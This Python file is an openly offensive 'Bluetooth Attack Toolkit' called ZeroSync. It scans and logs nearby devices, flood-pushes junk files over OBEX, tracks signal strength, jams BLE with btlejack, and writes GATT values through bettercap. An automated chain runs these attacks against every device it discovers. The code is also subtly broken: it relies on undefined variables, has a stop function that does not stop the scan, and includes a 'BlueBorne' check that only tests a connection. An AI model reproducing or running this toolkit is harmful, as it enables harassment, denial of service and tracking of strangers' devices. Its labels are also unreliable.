import os
import sys
import subprocess
import threading
import time
from bluetooth import BluetoothSocket, discover_devices
from rich.console import Console
from rich.panel import Panel
from rich.prompt import Prompt
from rich.table import Table
from datetime import datetime

scanned = {}
scanning = False


console = Console()



def main_menu():
    while True:
        console.print(Panel.fit(
            "[bold bright_cyan]ZeroSync v4.1[/bold bright_cyan]\n[bright_green]Bluetooth Attack Toolkit[/bright_green]\n[italic yellow]Created by Null_Lyfe[/italic yellow]",
            border_style="bright_magenta", padding=(1,2)))

        table = Table(show_header=True, header_style="bold bright_green", show_lines=True, border_style="bright_blue")
        table.add_column("Option", justify="center", style="bright_yellow")
        table.add_column("Attack Module", justify="left", style="bright_cyan")

        menu_options = [
            ("1", "📡 Scan Devices"),
            ("2", "🛑 Stop Scanning"),
            ("3", "📋 Show Devices"),
            ("4", "🐞 BlueBorne Scan"),
            ("5", "💣 OBEX File Bomb"),
            ("6", "📶 Signal Strength Tracker"),
            ("7", "🔗 Bettercap BLE Command"),
            ("8", "🚨 Auto Attack Chain"),
            ("9", "🛰️ Bettercap BLE Recon"),
            ("10", "📡 BLE Jammer (btlejack)"),
            ("11", "⚙️ BLE GATT Injector (Bettercap)"),
            ("0", "🚪 Exit ZeroSync"),
        ]

        for option, description in menu_options:
            table.add_row(option, description)

        console.print(table)

        choice = Prompt.ask("[bold magenta]Choose an option[/bold magenta]")
        if choice == "1":
            start_scan_thread()
        elif choice == "2":
            stop_scan()
        elif choice == "3":
            show_scanned_devices()
        elif choice == "4":
            blueborne_scanner()
        elif choice == "5":
            target = select_device()
            if target: obex_file_bomb(target)
        elif choice == "6":
            target = select_device()
            if target: signal_strength_tracker(target)
        elif choice == "7":
            bettercap_bridge()
        elif choice == "8":
            auto_attack_chain()
        elif choice == "9":
            bettercap_ble_attack()
        elif choice == "10":
            launch_btlejack_jammer()
        elif choice == "11":
            bettercap_gatt_inject()
        elif choice == "0":
            console.print("[bold red]Exiting ZeroSync...[/bold red]")
            exit()
        else:
            console.print("[red]Invalid option. Please select again.[/red]")
def scan_devices():
    global scanning
    scanning = True
    scanned.clear()
    log_path = "zerosync_scanlog.txt"
    console.print(Panel("Starting Bluetooth scan... [cyan]Logging to[/cyan] [green]zerosync_scanlog.txt[/green]", style="bold magenta"))
    with open(log_path, "a") as log_file:
        log_file.write(f"\n--- Scan Started: {datetime.now()} ---\n")
        with console.status("[bold green]Scanning for Bluetooth devices...[/bold green]", spinner="dots"):
            while scanning:
                try:
                    nearby = discover_devices(lookup_names=True, duration=8)
                    for addr, name in nearby:
                        if addr not in scanned:
                            scanned[addr] = name
                            log_file.write(f"[{datetime.now()}] {addr} - {name}\n")
                            console.print(f"[green][+][/green] {addr} - {name}")
                except Exception as e:
                    console.print(f"[red]Error scanning:[/red] {e}")
                time.sleep(1)
        log_file.write(f"--- Scan Ended: {datetime.now()} ---\n")
def start_scan_thread():
    global scan_thread
    scan_thread = threading.Thread(target=scan_devices)
    scan_thread.start()

def stop_scan():
    global scan_stop_flag
    scan_stop_flag = True
    console.print(Panel("Scan stopped.", style="red"))

def show_scanned_devices():
    if not scanned_devices:
        console.print("[yellow]No devices scanned yet.[/yellow]")
        return
    table = Table(title="Scanned Devices")
    table.add_column("Index", style="bold")
    table.add_column("MAC Address", style="cyan")
    table.add_column("Name", style="magenta")
    for i, (addr, name) in enumerate(scanned_devices):
        table.add_row(str(i), addr, name)
    console.print(table)

def select_device():
    show_scanned_devices()
    idx = Prompt.ask("Enter device index", default="0")
    try:
        idx = int(idx)
        return scanned_devices[idx][0]
    except:
        console.print("[red]Invalid selection[/red]")
        return None

def blueborne_scanner():
    console.print(Panel("BlueBorne Scanner (CVE-2017-0785)", style="bold magenta"))
    for addr, name in scanned_devices:
        try:
            sock = BluetoothSocket(L2CAP)
            sock.settimeout(3)
            sock.connect((addr, 0x1001))  # ATT channel
            console.print(f"[red]VULNERABLE:[/red] {name} ({addr})")
            sock.close()
        except:
            console.print(f"[green]Secure:[/green] {name} ({addr})")

def obex_file_bomb(target_mac):
    console.print(Panel(f"Launching OBEX file bomb on {target_mac}", style="bold red"))
    junk_file = "/tmp/zerosync_junk.txt"
    with open(junk_file, "w") as f:
        f.write("ZEROSYNCBOMB" * 10000)
    for i in range(5):
        os.system(f"obexftp --nopath --noconn --uuid none --bluetooth {target_mac} --channel 9 -p {junk_file}")
        console.print(f"[yellow]Bomb file {i+1} sent.[/yellow]")
    console.print("[green]OBEX bombing complete.[/green]")

def signal_strength_tracker(target_mac):
    console.print(Panel(f"Tracking RSSI of {target_mac}", style="cyan"))
    for i in range(10):
        try:
            rssi = subprocess.check_output(f"hcitool rssi {target_mac}", shell=True, text=True).strip()
            console.print(f"[blue]{rssi}[/blue]")
        except:
            console.print("[red]RSSI read failed[/red]")
        time.sleep(2)

def bettercap_bridge():
    command = Prompt.ask("Enter Bettercap BLE command")
    try:
        result = subprocess.check_output(["sudo", "bettercap", "-eval", command], stderr=subprocess.STDOUT, text=True)
        console.print(result)
    except subprocess.CalledProcessError as e:
        console.print(f"[red]Bettercap error:[/red] {e.output}")


def bettercap_ble_attack():
    console.print(Panel("Launching Bettercap BLE Recon", style="bold cyan"))
    try:
        script = "ble.recon on; ble.scan on; sleep 10; ble.show"
        result = subprocess.check_output(["sudo", "bettercap", "-eval", script], stderr=subprocess.STDOUT, text=True)
        console.print(result)
    except subprocess.CalledProcessError as e:
        console.print(f"[red]Bettercap BLE error:[/red] {e.output}")

def auto_attack_chain():
    console.print(Panel("Starting Auto Attack Chain", style="bold red"))
    start_scan_thread()
    time.sleep(12)
    stop_scan()
    if not scanned_devices:
        console.print("[yellow]No devices found. Aborting chain.[/yellow]")
        return

    show_scanned_devices()
    for addr, name in scanned_devices:
        console.print(Panel(f"Attacking {name} ({addr})", style="red"))
        try:
            sock = BluetoothSocket(L2CAP)
            sock.settimeout(3)
            sock.connect((addr, 0x1001))
            console.print(f"[red]BlueBorne: VULNERABLE[/red] - {name} ({addr})")
            sock.close()
        except:
            console.print(f"[green]BlueBorne: Secure[/green] - {name} ({addr})")

        # OBEX bomb
        try:
            junk_file = "/tmp/zerosync_autobomb.txt"
            with open(junk_file, "w") as f:
                f.write("ZEROSYNCCHAIN" * 10000)
            os.system(f"obexftp --nopath --noconn --uuid none --bluetooth {addr} --channel 9 -p {junk_file}")
            console.print("[yellow]OBEX Bomb sent[/yellow]")
        except:
            console.print("[red]OBEX bomb failed[/red]")

        # RSSI
        try:
            rssi = subprocess.check_output(f"hcitool rssi {addr}", shell=True, text=True).strip()
            console.print(f"[blue]RSSI: {rssi}[/blue]")
        except:
            console.print("[red]RSSI read failed[/red]")

    console.print("[green]Auto attack chain complete.[/green]")

def launch_btlejack_jammer():
    console.print(Panel("Launching BLE Jammer (btlejack)...", style="bold red"))
    try:
        result = subprocess.check_output(["btlejack", "-j"], stderr=subprocess.STDOUT, text=True)
        console.print(result)
        script = f"ble.recon on; ble.scan on; sleep 5; ble.connect {target}; sleep 3; ble.gatt.read; ble.gatt.write 0x0003 0xFF"
        result = subprocess.check_output(["sudo", "bettercap", "-eval", script], stderr=subprocess.STDOUT, text=True)
        console.print(result)
    except subprocess.CalledProcessError as e:
        console.print(f"[red]Bettercap GATT error:[/red] {e.output}")

def bettercap_gatt_inject():
    target = select_device()
    if not target:
        return
    console.print(Panel(f"Injecting via Bettercap on {target}", style="bold magenta"))
    try:
        script = f"ble.recon on; ble.scan on; sleep 5; ble.connect {target}; sleep 3; ble.gatt.read; ble.gatt.write 0x0003 0xFF"
        result = subprocess.check_output(["sudo", "bettercap", "-eval", script], stderr=subprocess.STDOUT, text=True)
        console.print(result)
    except subprocess.CalledProcessError as e:
        console.print(f"[red]Bettercap GATT error:[/red] {e.output}")

if __name__ == "__main__":
    main_menu()
